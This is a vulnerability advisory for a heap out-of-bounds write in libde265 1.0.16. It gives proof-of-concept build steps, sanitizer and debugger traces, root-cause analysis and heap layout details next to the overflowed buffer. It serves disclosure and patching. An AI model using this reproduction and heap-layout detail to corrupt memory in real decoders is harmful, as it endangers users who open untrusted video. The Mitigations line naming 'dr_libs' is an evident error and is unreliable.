# heap out-of-bounds write in libde265 1.0.16

- **CVE ID:** [CVE-2026-33165](https://www.cve.org/CVERecord?id=CVE-2026-33165)
- **Product:** [libde265](https://github.com/strukturag/libde265)
- **Reported:** 2026-03-15
- **Published:** 2026-03-17
- **Severity:** Medium
- **CWE:** [CWE-787: Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html)
- **Discovered by:** Ana Kapulica of Marlink Cyber

---

## Summary

A crafted HEVC bitstream causes an out-of-bounds heap write confirmed by AddressSanitizer. The trigger is a stale `ctb_info.log2unitSize` after an SPS change where `PicWidthInCtbsY` and `PicHeightInCtbsY` stay constant but `Log2CtbSizeY` changes, causing `set_SliceHeaderIndex` to index past the allocated image metadata array and write 2 bytes past the end of a heap allocation.

---

## Affected Versions

| Version              | Status    |
| -------------------- | --------- |
| libde265 <= v1.0.16   | Vulnerable |
| libde265 => v1.0.17   | Patched |

---

## Proof of Concept

## Reproducer

[PoC.zip](./MCSAID-2026-004-PoC.zip)

A 254-byte minimized bitstream is attached (`reproducer.bin`), reduced from the original fuzzer-generated input using `libFuzzer -minimize_crash=1`.

Build the standalone PoC (run from the directory containing `poc.c` and `reproducer.bin`, with `libde265-1.0.16/` as a sibling directory):

```sh
# Build libde265 with ASan, assertions disabled (release-like)
cd libde265-1.0.16
CC=clang CXX=clang++ \
  CFLAGS="-fsanitize=address -g -O1 -DNDEBUG" \
  CXXFLAGS="-fsanitize=address -g -O1 -DNDEBUG" \
  LDFLAGS="-fsanitize=address" \
  ./configure --disable-shared --enable-static --disable-dec265
make -j$(nproc) -C libde265
cd ..

# Build PoC
clang -fsanitize=address -g -O1 -DNDEBUG \
    poc.c \
    -I libde265-1.0.16/libde265 -I libde265-1.0.16 \
    libde265-1.0.16/libde265/.libs/libde265.a \
    -lstdc++ -o poc

./poc reproducer.bin
```

`poc.c` is a minimal standalone decoder that feeds the input to the libde265 API without any fuzzer runtime dependency.

---

## ASan Output

```
=================================================================
==46762==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x51e000000a42 at pc 0x5bdb7a052986 bp 0x7ffdf7d40390 sp 0x7ffdf7d40388
WRITE of size 2 at 0x51e000000a42 thread T0
    #0 0x5bdb7a052985 in de265_image::set_SliceHeaderIndex(int, int, int) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/../libde265/image.h:741:40
    #1 0x5bdb7a052985 in read_coding_tree_unit(thread_context*) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/slice.cc:2866:8
    #2 0x5bdb7a05d8c0 in decode_substream(thread_context*, bool, bool) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/slice.cc:4755:5
    #3 0x5bdb7a060413 in read_slice_segment_data(thread_context*) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/slice.cc:5068:14
    #4 0x5bdb7a00d576 in decoder_context::decode_slice_unit_sequential(image_unit*, slice_unit*) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/decctx.cc:857:7
    #5 0x5bdb7a00bb39 in decoder_context::decode_slice_unit_parallel(image_unit*, slice_unit*) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/decctx.cc:959:11
    #6 0x5bdb7a00aa66 in decoder_context::decode_some(bool*) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/decctx.cc:744:13
    #7 0x5bdb7a0100a6 in decoder_context::decode(int*) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/decctx.cc:1343:11
    #8 0x5bdb79fffb92 in main /home/ana/fuzzing-lab/libde265/issue/poc.c:40:15
    #9 0x76ba8682a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x76ba8682a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5bdb79f26574 in _start (/home/ana/fuzzing-lab/libde265/issue/poc+0x39574) (BuildId: 3ae08bcdda6ef43586d31d0466678832370a5d0f)

0x51e000000a42 is located 2 bytes after 2496-byte region [0x51e000000080,0x51e000000a40)
allocated by thread T0 here:
    #0 0x5bdb79fc13c3 in malloc (/home/ana/fuzzing-lab/libde265/issue/poc+0xd43c3) (BuildId: 3ae08bcdda6ef43586d31d0466678832370a5d0f)
    #1 0x5bdb7a02d40a in MetaDataArray<CTB_info>::alloc(int, int, int) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/./image.h:94:25
    #2 0x5bdb7a02d40a in de265_image::alloc_image(int, int, de265_chroma, std::shared_ptr<seq_parameter_set const>, bool, decoder_context*, long, void*, bool) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/image.cc:463:39
    #3 0x5bdb7a029b20 in decoded_picture_buffer::new_image(std::shared_ptr<seq_parameter_set const>, decoder_context*, long, void*, bool) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/dpb.cc:266:28
    #4 0x5bdb7a008fd6 in decoder_context::process_slice_segment_header(slice_segment_header*, de265_error*, long, nal_header*, void*) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/decctx.cc:2042:28
    #5 0x5bdb7a007090 in decoder_context::read_slice_NAL(bitreader&, NAL_unit*, nal_header&) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/decctx.cc:650:7
    #6 0x5bdb7a00fae1 in decoder_context::decode_NAL(NAL_unit*) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/decctx.cc:1244:11
    #7 0x5bdb7a00ff91 in decoder_context::decode(int*) /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/decctx.cc:1332:16

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/ana/fuzzing-lab/libde265/libde265-1.0.16/libde265/../libde265/image.h:741:40 in de265_image::set_SliceHeaderIndex(int, int, int)
Shadow bytes around the buggy address:
  0x51e000000780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51e000000800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51e000000880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51e000000900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51e000000980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x51e000000a00: 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa
  0x51e000000a80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51e000000b00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51e000000b80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51e000000c00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51e000000c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==46762==ABORTING
```

The `=>` row is the shadow row containing the crash address `0x51e000000a42`. Each shadow byte covers 8 application bytes; the `[fa]` marks the shadow byte whose range includes `0xa42`. The allocation ends at `0xa40`, so `0xa40–0xa47` is the first redzone cell — the write at `0xa42` is 2 bytes into that cell.

---

## Valgrind Confirmation (no ASan, `-DNDEBUG`)

```sh
valgrind --tool=memcheck ./poc_release_dbg reproducer.bin
```

```
==9132== Memcheck, a memory error detector
==9132== Copyright (C) 2002-2022, and GNU GPL'd, by Julian Seward et al.
==9132== Using Valgrind-3.22.0 and LibVEX; rerun with -h for copyright info
==9132== Command: ./poc_release_dbg reproducer.bin
==9132== 
==9132== Invalid write of size 2
==9132==    at 0x12AFF0: read_coding_tree_unit(thread_context*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x12F62A: decode_substream(thread_context*, bool, bool) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x12FE4D: read_slice_segment_data(thread_context*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10FA79: decoder_context::decode_slice_unit_sequential(image_unit*, slice_unit*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10F375: decoder_context::decode_slice_unit_parallel(image_unit*, slice_unit*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10ED91: decoder_context::decode_some(bool*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x110669: decoder_context::decode(int*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10B649: main (poc.c:40)
==9132==  Address 0x4e7eb32 is 2 bytes after a block of size 2,496 alloc'd
==9132==    at 0x4846828: malloc (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)
==9132==    by 0x11EFB2: de265_image::alloc_image(int, int, de265_chroma, std::shared_ptr<seq_parameter_set const>, bool, decoder_context*, long, void*, bool) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x11DC6A: decoded_picture_buffer::new_image(std::shared_ptr<seq_parameter_set const>, decoder_context*, long, void*, bool) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10E895: decoder_context::process_slice_segment_header(slice_segment_header*, de265_error*, long, nal_header*, void*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10DF1D: decoder_context::read_slice_NAL(bitreader&, NAL_unit*, nal_header&) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x1103D3: decoder_context::decode_NAL(NAL_unit*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x110567: decoder_context::decode(int*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10B649: main (poc.c:40)
==9132== 
==9132== Invalid read of size 2
==9132==    at 0x1491BC: derive_edgeFlags_CTBRow(de265_image*, int) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x14A279: apply_deblocking_filter(de265_image*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10EF3A: decoder_context::decode_some(bool*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x110669: decoder_context::decode(int*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10B649: main (poc.c:40)
==9132==  Address 0x4e7eb32 is 2 bytes after a block of size 2,496 alloc'd
==9132==    at 0x4846828: malloc (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)
==9132==    by 0x11EFB2: de265_image::alloc_image(int, int, de265_chroma, std::shared_ptr<seq_parameter_set const>, bool, decoder_context*, long, void*, bool) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x11DC6A: decoded_picture_buffer::new_image(std::shared_ptr<seq_parameter_set const>, decoder_context*, long, void*, bool) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10E895: decoder_context::process_slice_segment_header(slice_segment_header*, de265_error*, long, nal_header*, void*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10DF1D: decoder_context::read_slice_NAL(bitreader&, NAL_unit*, nal_header&) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x1103D3: decoder_context::decode_NAL(NAL_unit*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x110567: decoder_context::decode(int*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10B649: main (poc.c:40)
==9132== 
==9132== Invalid read of size 2
==9132==    at 0x149702: derive_boundaryStrength(de265_image*, bool, int, int, int, int) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x14A2B6: apply_deblocking_filter(de265_image*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10EF3A: decoder_context::decode_some(bool*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x110669: decoder_context::decode(int*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10B649: main (poc.c:40)
==9132==  Address 0x4e7eb4a is 26 bytes after a block of size 2,496 in arena "client"
==9132== 
==9132== Invalid read of size 2
==9132==    at 0x149761: derive_boundaryStrength(de265_image*, bool, int, int, int, int) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x14A2B6: apply_deblocking_filter(de265_image*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10EF3A: decoder_context::decode_some(bool*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x110669: decoder_context::decode(int*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10B649: main (poc.c:40)
==9132==  Address 0x4e7eb62 is 14 bytes before a block of size 9,992 alloc'd
==9132==    at 0x48485C3: operator new[](unsigned long) (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)
==9132==    by 0x11F00F: de265_image::alloc_image(int, int, de265_chroma, std::shared_ptr<seq_parameter_set const>, bool, decoder_context*, long, void*, bool) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x11DC6A: decoded_picture_buffer::new_image(std::shared_ptr<seq_parameter_set const>, decoder_context*, long, void*, bool) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10E895: decoder_context::process_slice_segment_header(slice_segment_header*, de265_error*, long, nal_header*, void*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10DF1D: decoder_context::read_slice_NAL(bitreader&, NAL_unit*, nal_header&) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x1103D3: decoder_context::decode_NAL(NAL_unit*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x110567: decoder_context::decode(int*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10B649: main (poc.c:40)
==9132== 
==9132== Invalid read of size 2
==9132==    at 0x149761: derive_boundaryStrength(de265_image*, bool, int, int, int, int) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x14A361: apply_deblocking_filter(de265_image*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10EF3A: decoder_context::decode_some(bool*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x110669: decoder_context::decode(int*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10B649: main (poc.c:40)
==9132==  Address 0x4e7eb32 is 2 bytes after a block of size 2,496 alloc'd
==9132==    at 0x4846828: malloc (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)
==9132==    by 0x11EFB2: de265_image::alloc_image(int, int, de265_chroma, std::shared_ptr<seq_parameter_set const>, bool, decoder_context*, long, void*, bool) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x11DC6A: decoded_picture_buffer::new_image(std::shared_ptr<seq_parameter_set const>, decoder_context*, long, void*, bool) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10E895: decoder_context::process_slice_segment_header(slice_segment_header*, de265_error*, long, nal_header*, void*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10DF1D: decoder_context::read_slice_NAL(bitreader&, NAL_unit*, nal_header&) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x1103D3: decoder_context::decode_NAL(NAL_unit*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x110567: decoder_context::decode(int*) (in /home/ana/fuzzing-lab/libde265/issue/poc_release_dbg)
==9132==    by 0x10B649: main (poc.c:40)
==9132== 
==9132== 
==9132== HEAP SUMMARY:
==9132==     in use at exit: 0 bytes in 0 blocks
==9132==   total heap usage: 197 allocs, 197 frees, 8,066,058 bytes allocated
==9132== 
==9132== All heap blocks were freed -- no leaks are possible
==9132== 
==9132== For lists of detected and suppressed errors, rerun with: -s
==9132== ERROR SUMMARY: 46 errors from 5 contexts (suppressed: 0 from 0)
```

---

## Debug-Build Confirmation (no ASan required)

The OOB is reproducible without ASan in a debug build (assertions enabled, no `-DNDEBUG`). Two additional inputs trigger the assert guards at `image.h:128–129`:

```cpp
assert(unitX >= 0 && unitX < width_in_units);   // image.h:128
assert(unitY >= 0 && unitY < height_in_units);  // image.h:129
```

One input triggers the `unitX` assert, one triggers the `unitY` assert — confirming the OOB condition is reachable on both axes independently. In a release build (`-DNDEBUG`) these assertions are compiled out and the write proceeds silently.

The assert crash is independent proof that the OOB condition is genuine: it is the library's own bounds check firing, not a sanitizer heuristic.

---

## Root Cause

The reproducer contains two SPS entries that share the same `PicWidthInCtbsY = 13` and `PicHeightInCtbsY = 8` but differ in `Log2CtbSizeY`: **5** in SPS 0, **6** in SPS 1.

`ctb_info` is re-allocated in `alloc_image` only when the CTB grid count changes (`image.cc:458–459`):

```cpp
// image.cc:458–459 — reallocation condition
if (ctb_info.width_in_units  != sps->PicWidthInCtbsY ||
    ctb_info.height_in_units != sps->PicHeightInCtbsY)
    // Log2CtbSizeY is NOT checked
```

Because both `PicWidthInCtbsY` and `PicHeightInCtbsY` are equal across the two SPS entries, `ctb_info` is not reallocated for the second picture. The field `ctb_info.log2unitSize` remains **5** (stale from SPS 0) while the active SPS now has `Log2CtbSizeY = 6`.

The per-iteration guard in `decode_substream` (`slice.cc:4732–4733`) checks CTB coordinates and passes for this CTB:

```cpp
// slice.cc:4732–4733
if (ctbx >= sps.PicWidthInCtbsY ||
    ctby >= sps.PicHeightInCtbsY) {   // 0 >= 13 → false, 4 >= 8 → false — guard passes
```

In `read_coding_tree_unit`, pixel coordinates are computed with the **new** `Log2CtbSizeY`:

```cpp
// slice.cc:2857–2866
int yCtbPixels = yCtb << sps.Log2CtbSizeY;   // 4 << 6 = 256
img->set_SliceHeaderIndex(xCtbPixels, yCtbPixels, shdr->slice_index);
```

Inside `ctb_info.get(x, y)`, the pixel-to-unit conversion uses the **stale** `log2unitSize`:

```cpp
// image.h:741 → image.h:124–131
DataUnit& get(int x, int y) {
    int unitY = y >> log2unitSize;      // 256 >> 5 = 8  (stale log2unitSize)
    // assert(unitY < height_in_units) — compiled out in release build
    return data[ unitX + unitY*width_in_units ];    // OOB WRITE
}
```

`unitY = 8 >= height_in_units = 8` — one row past the end of the 104-entry array. The write is 2 bytes (`sizeof(CTB_info::SliceHeaderIndex)`) past the end of the heap allocation for `ctb_info.data`.

---

## Heap Layout at Crash (GDB-confirmed)

Build:

```sh
cd libde265-1.0.16
CC=clang CXX=clang++ \
  CFLAGS="-g -O0 -DNDEBUG" \
  CXXFLAGS="-g -O0 -DNDEBUG" \
  ./configure --disable-shared --enable-static --disable-dec265
make clean -C libde265
make -j$(nproc) -C libde265
cd ..

clang -g -O0 -DNDEBUG \
    poc.c \
    -I libde265-1.0.16/libde265 -I libde265-1.0.16 \
    libde265-1.0.16/libde265/.libs/libde265.a \
    -lstdc++ -o poc_gdb
```

GDB session:

```
(gdb) break de265_image::set_SliceHeaderIndex
Breakpoint 1 at 0x3dc39: file ../libde265/image.h, line 741.
(gdb) condition 1 (y >> this->ctb_info.log2unitSize) >= this->ctb_info.height_in_units
(gdb) run

Breakpoint 1, de265_image::set_SliceHeaderIndex (
    this=0x555555646cd0, x=0, y=256, SliceHeaderIndex=0)
    at ../libde265/image.h:741
741        ctb_info.get(x,y).SliceHeaderIndex = SliceHeaderIndex;

(gdb) p x
$1 = 0
(gdb) p y
$2 = 256
(gdb) p y >> this->ctb_info.log2unitSize
$3 = 8                                      ← unitY
(gdb) p this->ctb_info.height_in_units
$4 = 8                                      ← unitY == height_in_units → OOB by 1 row
(gdb) p this->ctb_info.width_in_units
$5 = 13
(gdb) p this->ctb_info.log2unitSize
$6 = 5
(gdb) p this->ctb_info.data_size
$7 = 104
(gdb) p this->ctb_info.data
$8 = (struct {...} *) 0x5555556855f0
(gdb) p sizeof(*this->ctb_info.data)
$9 = 24
(gdb) p this->ctb_info.data_size * sizeof(*this->ctb_info.data)
$10 = 2496                                  ← total allocation = 104 × 24 bytes

(gdb) set $end = (char*)this->ctb_info.data + this->ctb_info.data_size * sizeof(*this->ctb_info.data)
(gdb) x/4xg $end
0x555555685fb0:    0x0000000000000000    0x0000000000002711
0x555555685fc0:    0x0000000000000068    0x0000000000000001

(gdb) p /x *((unsigned long*)($end + 8))
$11 = 0x2711
(gdb) p *((unsigned long*)($end + 8)) & ~7
$12 = 10000                                 ← chunk size: 10000 - 16 header = 9984 user bytes
(gdb) p (10000 - 16) / 104
$13 = 96                                    ← sizeof(de265_progress_lock) = 96 bytes

(gdb) finish
Run till exit from #0  de265_image::set_SliceHeaderIndex (
    this=0x555555646cd0, x=0, y=256, SliceHeaderIndex=0)
    at ../libde265/image.h:741
read_coding_tree_unit (tctx=0x7fffffff9250) at slice.cc:2868
2868      int CtbAddrInSliceSeg = tctx->CtbAddrInRS - shdr->slice_segment_address;
(gdb) p *(short*)($end + 2)
$14 = 0
```

**`ctb_info` allocation** - 2496 bytes (`104 CTBs × 24`), confirmed by `$10`.

**Observed adjacent allocation in this run** - the two 8-byte words at `$end` are
shown above. Separately in GDB, `sizeof(de265_progress_lock) = 96` is confirmed.

Layout of de265_progress_lock on x86-64 Linux (glibc):

| Offset | Field | Size |
|---|---|---|
| 0 | `int mProgress` | 4 bytes |
| 4 | (padding) | 4 bytes |
| 8 | `pthread_mutex_t` | 40 bytes |
| 48 | `pthread_cond_t` | 48 bytes |

Write target - SliceHeaderIndex is the second field in CTB_info, at offset 2. For the first out-of-bounds element (index 104), the corresponding field lands at `$end + 2`. In this GDB run, `p *(short*)($end + 2)` returned `0`.

---

## Impact

A crafted HEVC bitstream triggers a 2-byte heap out-of-bounds write in set_SliceHeaderIndex, confirmed by ASan, Valgrind, and GDB. A stale log2unitSize after an SPS change causes ctb_info indexing to write one row past the end of the allocated metadata array into an adjacent heap object, resulting in memory corruption. Any application decoding untrusted HEVC content via libde265 is affected.

---

## Mitigations

- Update dr_libs to the latest commit on the master branch

---

## References

- GitHub Advisory: [heap out-of-bounds write in libde265 1.0.16](https://github.com/strukturag/libde265/security/advisories/GHSA-653q-9f73-8hvg#event-583664)
- Fix commit: [fix reallocation of metadata array when ctb size changes (thanks to Ana K.)](https://github.com/strukturag/libde265/commit/c7891e412106130b83f8e8ea8b7f907e9449b658)

